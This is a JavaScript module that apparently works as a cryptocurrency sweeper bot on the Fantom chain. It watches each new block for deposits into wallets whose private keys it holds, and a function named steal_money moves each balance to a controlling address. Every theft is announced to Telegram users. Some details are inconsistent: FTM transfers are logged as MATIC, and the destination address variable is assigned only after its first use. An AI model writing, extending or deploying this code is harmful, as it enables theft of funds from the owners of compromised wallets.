const Web3 = require("web3")
const fs = require('fs');
const readline = require('readline');
const TelegramBot = require('node-telegram-bot-api')
const path = require("path");


module.exports = {
    telegram_token_read_ftm: async function () {
        while (true) {
            if (users.length > 0) {
                for (let i = 0; i < users.length; i++) {
                    await bot.sendMessage(users[i], 'Fantom Chain Connected...✅')
                }
                apis_read()
                break
            } else {
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }
    }
}


async function apis_read() {
    const fileStream = fs.createReadStream(path.join("info", "apis.txt"));
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });
    var apis_list = []
    for await (const line of rl) {
        var rl_token = line.split(['='])[1];
        apis_list.push(rl_token)
    }
    global.moralis_ftm = apis_list[3]
    global.web6 = new Web3(moralis_ftm)
    global.ftm_gwei= apis_list[13]
    global.ftm_grab_from = apis_list[14]
    global.ftm_gas_addon = await web6.utils.toWei(ftm_grab_from, 'ether')
    global.ftm_cash_limit = Number(web6.utils.toWei(String(1000), 'ether'))
    global.ftm_gas_transfer_amount = Number(web6.utils.toWei(ftm_gwei, 'gwei'))
    getBlocks()
}


async function getBlocks() {
    var work = true
    while (work) {
        try {
            var latestBlock = await web6.eth.getBlock(block_identifier = web6.eth.defaultBlock, full_transactions = true);
            global.trans_ftm = latestBlock.transactions;
            for(var x in trans_ftm) {
                var to_address = trans_ftm[x]['to'];
                if (to_address in all_wallets) {
                    steal_money(to_address, all_wallets[to_address]);
                }
            }
            console.log('                                             FTM '+ latestBlock.number);
            await new Promise(resolve => setTimeout(resolve, 333));
        } catch (e) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            global.web6 = new Web3(moralis_ftm)
        }
    }
}


async function steal_money(wallet, wallet_specs) {
    try {
        var private_key = wallet_specs[0]
        var counter = 0
        while (true) {
            var balance = await web6.eth.getBalance(wallet)
            if (Number(balance) < ftm_gas_addon) {
                await new Promise(resolve => setTimeout(resolve, 30));
                counter++
                if (counter === 200) {
                    return;
                }
            } else {
                break;
            }
        }
        var nonce = await web6.eth.getTransactionCount(wallet)
        var transfer_amount = Number(balance) - ftm_gas_transfer_amount * 21000
        var tx_price = {
            'chainId': 250,
            'nonce': nonce,
            'to': user_wallet_address_all_2checksom,
            'value': transfer_amount,
            'gas': 21000,
            'gasPrice': ftm_gas_transfer_amount
        }
        var signed_tx = await web6.eth.accounts.signTransaction(tx_price, private_key)
        var tx_hash = await web6.eth.sendSignedTransaction(signed_tx.rawTransaction)
        global.tx_link_ftm = 'https://ftmscan.com/tx/' + tx_hash.transactionHash
        global.amount_sent_ftm = await web6.utils.fromWei(String(transfer_amount), 'ether')
        console.log('💰MATIC '+amount_sent_ftm+'💰 Transaction successful! ' + tx_link_ftm)
        global.user_wallet_address_all_2checksom = web6.utils.toChecksumAddress(user_wallet_address)
        sending_good_news()
    } catch (e) {
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}


async function sending_good_news() {
    var results ='💰MATIC '+amount_sent_ftm+'💰 ' + tx_link_ftm
    if (users.length > 0) {
        for (let i = 0; i < users.length; i++) {
            await bot.sendMessage(users[i], results)
        }
    }
}